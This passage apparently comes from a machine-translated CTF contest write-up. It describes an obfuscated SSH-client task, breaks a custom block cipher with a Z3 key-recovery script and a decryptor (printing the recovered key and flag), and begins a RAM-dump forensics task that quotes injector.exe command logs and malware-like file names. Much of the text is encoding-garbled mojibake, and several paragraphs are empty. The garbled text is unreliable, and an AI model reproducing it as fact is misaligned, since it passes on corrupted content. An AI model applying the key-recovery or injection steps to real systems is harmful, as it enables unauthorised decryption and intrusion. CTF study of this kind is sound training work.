<b>ç¬¬äºŒå</b> </td><td align="center">  <b>ç¬¬ä¸‰å</b> </td></tr><tr><td align="center"> æ²ƒæ–¯ </td><td align="center"> åŠæœˆ </td><td align="center"> å…‹æ´› </td></tr><tr><td colspan="3" align="center"> è¿˜å†³å®šäº†ï¼šMaxim Proninï¼Œ0x3c3eï¼Œtinkerlockï¼Œdemidov_alï¼Œx @ secatorï¼Œgroke_in_the_skyï¼Œd3fl4t3 </td></tr></tbody></table></div><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">RuCTFE</a>å‡†å¤‡çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ä»»åŠ¡</a> ã€‚ ä¸ºå‚ä¸è€…æä¾›äº†å…·æœ‰å¤šç§åè°ƒè¯•æŠ€æœ¯çš„æ¨¡ç³Šå¯æ‰§è¡Œæ–‡ä»¶ã€‚ å¯æ‰§è¡Œæ–‡ä»¶å°±åƒè¿æ¥åˆ°å…ˆå‰å·²çŸ¥æœåŠ¡å™¨çš„SSHå®¢æˆ·ç«¯ä¸€æ ·ã€‚ ä»»åŠ¡æ˜¯äº†è§£æ­¤æ–‡ä»¶çš„ç®—æ³•ï¼Œä»¥ä¾¿åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚ ä½œè€…çš„è§£å†³æ–¹æ¡ˆæ¶‰åŠç»•è¿‡åè°ƒè¯•å’Œåˆ†ææ··æ·†ã€‚ </p><br><p> å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ€å¿«çš„å‚ä¸è€…ä»¥ä¸åŒäºä½œè€…è®¡åˆ’çš„åŸå§‹æ–¹å¼è§£å†³äº†ä»»åŠ¡ï¼Œæ­¤åä»–æ‰¾åˆ°äº†å¦ä¸€ç§è§£å†³æ–¹æ³•ã€‚ æ‚¨å¯ä»¥åœ¨ä¸‹é¢çš„æ‰°æµæ¿ä¸‹çœ‹åˆ°ä»–çš„æ“ä½œæ–¹å¼ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">ç¬¬äº”å¤©ä»»åŠ¡è§£å†³æ–¹æ¡ˆé€‰é¡¹ï¼ˆVOSï¼‰</b> <div class="spoiler_text"><iframe width="560" height="315" src="https://www.youtube.com/embed/rpq5R9wnoiM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/00xBulNZkGI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div><br><h2> ç¬¬å…­å¤©ã€‚è§£é” </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> ä¼˜èƒœè€… </td></tr><tr><td align="center">  <b>ç¬¬ä¸€å</b> </td><td align="center">  <b>ç¬¬äºŒå</b> </td><td align="center">  <b>ç¬¬ä¸‰å</b> </td></tr><tr><td align="center">  Godaswag </td><td align="center">  medidrdrider </td><td align="center"> ç³»ç»Ÿ </td></tr></tbody></table></div><br><p> ç¬¬å…­å¤©çš„ä»»åŠ¡æ˜¯ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">VolgaCTF</a>å›¢é˜Ÿå‡†å¤‡çš„ã€‚ ç»™å®šä¸€ä¸ªå®ç°è‡ªå®šä¹‰åŠ å¯†ç®—æ³•çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä»»åŠ¡æ˜¯åœ¨æ²¡æœ‰å·²çŸ¥å¯†é’¥çš„æƒ…å†µä¸‹è§£å¯†ä½¿ç”¨è¯¥ç®—æ³•åŠ å¯†çš„æ¡ä»¶ä¸­ç»™å‡ºçš„æ–‡ä»¶ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">ç¬¬å…­å¤©ä»»åŠ¡è§£å†³æ–¹æ¡ˆï¼ˆgotdaswagï¼‰</b> <div class="spoiler_text"><h3 id="intro"> ç®€ä»‹ </h3><br><p> ç»™å®šä¸€ä¸ªåŒ…å«ä¸¤ä¸ªæ–‡ä»¶çš„å½’æ¡£æ–‡ä»¶ï¼š <strong>locker</strong>å’Œ<strong>secret.png.enc</strong> ã€‚ </p><br><p> ç¬¬ä¸€ä¸ªæ–‡ä»¶æ˜¯Linux x86-64çš„<strong>ELF</strong> ï¼Œå®ƒæ¥æ”¶æ–‡ä»¶å’ŒåŠ å¯†å¯†é’¥ä½œä¸ºè¾“å…¥ï¼Œç¬¬äºŒä¸ªæ–‡ä»¶æ˜¯åŠ å¯†çš„<strong>PNG</strong>å›¾åƒã€‚ </p><br><pre> <code class="plaintext hljs"># ./locker Required option 'input' missing Usage: ./locker [options] Options: -i, --input in.png Input file path -o, --output out.png.enc Output file path -k, --key 0004081516234200 Encryption key in hex -h, --help Print this help menu</code> </pre> <br><h3 id="locker"> å‚¨ç‰©æŸœ </h3><br><p> åœ¨åˆ†æäº†IDAä¸­çš„æ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬åœ¨<strong>é¡¹ç›®:: main</strong>å‡½æ•°ä¸­æ‰¾åˆ°äº†åŠ å¯†ç®—æ³•ã€‚ </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/0a3/e68/c77/0a3e68c773b0ff4a7c4d09a321deecd1.png"></p><br><p> ç»è¿‡ç ”ç©¶ï¼Œæˆ‘ä»¬çŸ¥é“è¿™æ˜¯ä¸€ä¸ª<strong>å—å¯†ç </strong> ï¼ˆECBï¼‰ï¼Œå—å¤§å°ä¸º<strong>32ä½</strong> ï¼Œå¯†é’¥å¤§å°ä¸º<strong>64ä½</strong> ï¼Œè½®æ•°ä¸º<strong>77</strong> ã€‚ </p><br><h5 id="versiya-na-python">  Pythonç‰ˆæœ¬ </h5><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(p, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): n = (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = p ^ k x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: p &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: p |= <span class="hljs-number"><span class="hljs-number">1</span></span> k = ror(k, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) p = ror(p, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p</code> </pre> <br><h3 id="secret-key"> ç§˜é’¥ </h3><br><p> æˆ‘ä»¬çŸ¥é“åŠ å¯†æ–‡ä»¶æ˜¯<strong>PNG</strong>å›¾ç‰‡ã€‚ <br> å› æ­¤ï¼Œæˆ‘ä»¬çŸ¥é“äº†<strong>å‡ ä¸ª</strong>æ–‡ä»¶å¤´å½¢å¼<strong>çš„æ˜æ–‡å¯†æ–‡</strong> ï¼ˆPNGçš„æ ‡å‡†æ ¼å¼ï¼‰ã€‚ <br><img src="https://habrastorage.org/getpro/habr/post_images/0b7/ecb/770/0b7ecb770732ca1fdc9f8cba8f0d8248.png"></p><br><p> è®©æˆ‘ä»¬å°è¯•ç®€å•çš„æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨<strong>SMTæ±‚è§£å™¨</strong> ï¼ˆ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" title="Z3">Z3</a> ï¼‰æŸ¥æ‰¾åŠ å¯†å¯†é’¥ã€‚ <br> ä¸ºæ­¤ï¼Œè¯·ç¨å¾®ä¿®æ”¹ä»£ç ï¼Œç„¶åå°†ä¸€å¯¹æ˜æ–‡-å¯†æ–‡æäº¤ç»™è¾“å…¥ã€‚ </p><br><h5 id="task6_keypy">  task6_key.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-comment"><span class="hljs-comment"># PNG file signature (8 bytes) + IHDR chunk header (8 bytes) PLAIN_TEXT = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52' BLOCK_SIZE = 4 def encrypt(p, k, rounds=77): for i in range(0, rounds): n = LShR(p, 4) &amp; 1 n |= LShR(p, 26) &amp; 0xE0 n |= LShR(p, 22) &amp; 0x10 n |= LShR(p, 13) &amp; 8 n |= LShR(p, 7) &amp; 4 n |= LShR(p, 4) &amp; 2 x = k ^ ZeroExt(32, p) x ^= LShR(ZeroExt(32, p), 12) x ^= LShR(ZeroExt(32, p), 20) x &amp;= 1 y = 1 &lt;&lt; ZeroExt(32, n) y &amp;= 0xBB880F0FC30F0000 y = LShR(y, ZeroExt(32, n)) y &amp;= 1 p = If(x == y, p &amp; 0xFFFFFFFE, p | 1) p = RotateRight(p, 1) k = RotateRight(k, 1) return p def qword_le_to_be(v): pv = struct.pack('&lt;Q', v) uv = struct.unpack('&gt;Q', pv) return uv[0] if len(sys.argv) &lt; 2: sys.exit('no input file specified') with open(sys.argv[1], 'rb') as encrypted_file: k = BitVec('k', 64) key = k solver = Solver() for i in range(0, len(PLAIN_TEXT), BLOCK_SIZE): # prepare plain text and cipher text pairs pt = struct.unpack('&lt;L', PLAIN_TEXT[i:i + BLOCK_SIZE])[0] ct = struct.unpack('&lt;L', encrypted_file.read(BLOCK_SIZE))[0] p = BitVecVal(pt, 32) e = BitVecVal(ct, 32) solver.add(encrypt(p, k) == e) print('solving ...') if solver.check() == sat: encryption_key = solver.model()[key].as_long() print('key: %016X' % qword_le_to_be(encryption_key))</span></span></code> </pre> <br><p> è§£å†³æ–¹æ¡ˆï¼š </p><br><pre> <code class="plaintext hljs">&gt; python task6_key.py "secret.png.enc" solving ... key: AE34C511A8238BCC</code> </pre> <br><h3 id="unlocker"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> è§£é”è€… </font></font></h3><br><p>          . <br>                  . </p><br><h5 id="task6_unlockerpy"> task6_unlocker.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> binascii BLOCK_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span> ror = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; r_bits%max_bits) | \ (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) rol = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ (val &lt;&lt; r_bits%max_bits) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>) | \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; (max_bits-(r_bits%max_bits))) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(e, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> dk = ror(k, <span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): dk = rol(dk, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) e = rol(e, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) n = (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = e ^ dk x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: e &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: e |= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no input file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">3</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no output file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">4</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no encryption key specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: key = binascii.unhexlify(sys.argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]) key = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;Q'</span></span>, key)[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'non-hexadecimal encryption key'</span></span>) print(<span class="hljs-string"><span class="hljs-string">'unlocking ...'</span></span>) start_time = time.time() <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>], <span class="hljs-string"><span class="hljs-string">'rb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ef: <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> df: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: ct = ef.read(BLOCK_SIZE) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ct: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> ct = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, ct)[<span class="hljs-number"><span class="hljs-number">0</span></span>] pt = decrypt(ct, key) pt = struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, pt) df.write(pt) print(<span class="hljs-string"><span class="hljs-string">'done, took %.3f seconds.'</span></span> % (time.time() - start_time))</code> </pre> <br><p>  ,         . </p><br><pre> <code class="plaintext hljs">&gt; python task6_unlocker.py "secret.png.enc" "secret.png" "AE34C511A8238BCC" unlocking ... done, took 49.669 seconds.</code> </pre> <br><h5 id="secretpng"> secret.png </h5><br><p><img src="https://habrastorage.org/getpro/habr/post_images/9fa/18b/2b2/9fa18b2b2264379bd89ebcaaf62c3006.png"></p><br><blockquote> ZN{RA$T0GR@PHY_H3RTS} </blockquote></div></div><br><h2> Day 7. Beep Beep! </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  </td></tr><tr><td align="center"> <b>1 </b> </td></tr><tr><td align="center"> sysenter </td></tr></tbody></table></div><br><p>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SchoolCTF</a> .     ,    ,  .   ,       ,      . </p><br><div class="spoiler"> <b class="spoiler_title">    (sysenter)</b> <div class="spoiler_text"><p> Something that looks like VirtualBox RAM dump is provided to us. </p><br><p> We can try volatility, but it seems that it unable to locate required structures to restore Virtual Memory layout. </p><br><p><img src="https://habrastorage.org/webt/go/1l/7i/go1l7imiojbikday6awhxdrbw58.png"></p><br><p> No process memory for us today, so we will have to work with fragmented memory. </p><br><p> First of all let's precache strings from the dump. </p><br><pre> <code class="plaintext hljs">strings &gt; strings_ascii.txt strings -el &gt; strings_wide.txt</code> </pre> <br><p> Most interesting one is command execution log: </p><br><pre> <code class="plaintext hljs">cd .. .\injector.exe 192.168.1.65 .\run.exe .\storage cd .\server\ .\run.exe block1 .\run.exe block0 cd Z:\zn_2019\ cd .\server\ cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd .. touch echo echo qwe echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ injector.exe 1921.68.1.65 injector.exe 192.68.1.65 ./injector.exe 192.68.1.65 .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\server\ run storage .\run.exe .\storage cd Z:\zn_2019\server\ .\run.exe block1 cd Z:\zn_2019\server\ .\run.exe block0 cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 .\injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 '.\ConsoleApplication5 (2).exe' 192.168.1.65</code> </pre> <br><p> <strong>Not Important note:</strong> </p><br><p> <em>Not sure what <strong>SIGN.MEDIA</strong> is, but it looks like a cached file list from VirtualBox Network Share (Is this from Windows Registry?).</em> </p><br><pre> <code class="plaintext hljs">SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=138A400 zn_2019\Injector2.exe SIGN.MEDIA=138A400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\With_little_debug.exe SIGN.MEDIA=138A400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=138A400 zn_2019\injector.exe SIGN.MEDIA=138A400 zn_2019\nnnn.exe SIGN.MEDIA=138A400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=138A400 zn_2019\note.exe SIGN.MEDIA=138A400 zn_2019\note2.exe SIGN.MEDIA=138A400 zn_2019\note3.exe SIGN.MEDIA=138A400 zn_2019\note4.exe SIGN.MEDIA=138A400 zn_2019\random.exe SIGN.MEDIA=138A400 zn_2019\z.exe SIGN.MEDIA=17582C zn_2019\Injector2.exe SIGN.MEDIA=17582C zn_2019\injector.exe SIGN.MEDIA=196C2 zn_2019\server\run.exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C176B0 zn_2019\Injector2.exe SIGN.MEDIA=1C176B0 zn_2019\injector.exe SIGN.MEDIA=1C176B0 zn_2019\note.exe SIGN.MEDIA=1C176B0 zn_2019\note2.exe SIGN.MEDIA=1C176B0 zn_2019\note3.exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1D02C zn_2019\Injector2.exe SIGN.MEDIA=1C1D02C zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C1D02C zn_2019\With_little_debug.exe SIGN.MEDIA=1C1D02C zn_2019\injector.exe SIGN.MEDIA=1C1D02C zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C1D02C zn_2019\note.exe SIGN.MEDIA=1C1D02C zn_2019\note2.exe SIGN.MEDIA=1C1D02C zn_2019\note3.exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1DAB0 zn_2019\Injector2.exe SIGN.MEDIA=1C1DAB0 zn_2019\With_little_debug.exe SIGN.MEDIA=1C1DAB0 zn_2019\injector.exe SIGN.MEDIA=1C1DAB0 zn_2019\note.exe SIGN.MEDIA=1C1DAB0 zn_2019\note2.exe SIGN.MEDIA=1C1DAB0 zn_2019\note3.exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C30058 zn_2019\Injector2.exe SIGN.MEDIA=1C30058 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C30058 zn_2019\With_little_debug.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C30058 zn_2019\note.exe SIGN.MEDIA=1C30058 zn_2019\note2.exe SIGN.MEDIA=1C30058 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C89400 zn_2019\Injector2.exe SIGN.MEDIA=1C89400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C89400 zn_2019\NOTE1.exe SIGN.MEDIA=1C89400 zn_2019\With_little_debug.exe SIGN.MEDIA=1C89400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C89400 zn_2019\injector.exe SIGN.MEDIA=1C89400 zn_2019\nnnn.exe SIGN.MEDIA=1C89400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note2.exe SIGN.MEDIA=1C89400 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\note4.exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C8A800 zn_2019\Injector2.exe SIGN.MEDIA=1C8A800 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C8A800 zn_2019\NOTE1.exe SIGN.MEDIA=1C8A800 zn_2019\With_little_debug.exe SIGN.MEDIA=1C8A800 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C8A800 zn_2019\injector.exe SIGN.MEDIA=1C8A800 zn_2019\nnnn.exe SIGN.MEDIA=1C8A800 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C8A800 zn_2019\note.exe SIGN.MEDIA=1C8A800 zn_2019\note2.exe SIGN.MEDIA=1C8A800 zn_2019\note3.exe SIGN.MEDIA=1C8A800 zn_2019\note4.exe SIGN.MEDIA=2D702C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=3EDC2 zn_2019\server\a.exe SIGN.MEDIA=3EDC2 zn_2019\server\hui.exe SIGN.MEDIA=3EDC2 zn_2019\server\run.exe SIGN.MEDIA=4482C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=4482C zn_2019\PEview.exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=5B0058 zn_2019\Injector2.exe SIGN.MEDIA=5B0058 zn_2019\injector.exe SIGN.MEDIA=5B0058 zn_2019\note.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Discord.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Far.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\FileZillaFTPclient.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\InputDirector.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\KeePass.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\PicPick.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Skype.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\UpdateManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\VBoxManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\idaq.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\javaw.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\lunix.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\paint.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\python3.7.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\r.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\svghost.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\tsm.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\usha.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=AB82C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=AB82C zn_2019\injector.exe SIGN.MEDIA=B06D4C64 zn_2019\server\a.exe SIGN.MEDIA=B06D4C64 zn_2019\server\hui.exe SIGN.MEDIA=B06D4C64 zn_2019\server\run.exe SIGN.MEDIA=B06D4C64 zn_2019\server\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=BA802 zn_2019\server\run.exe 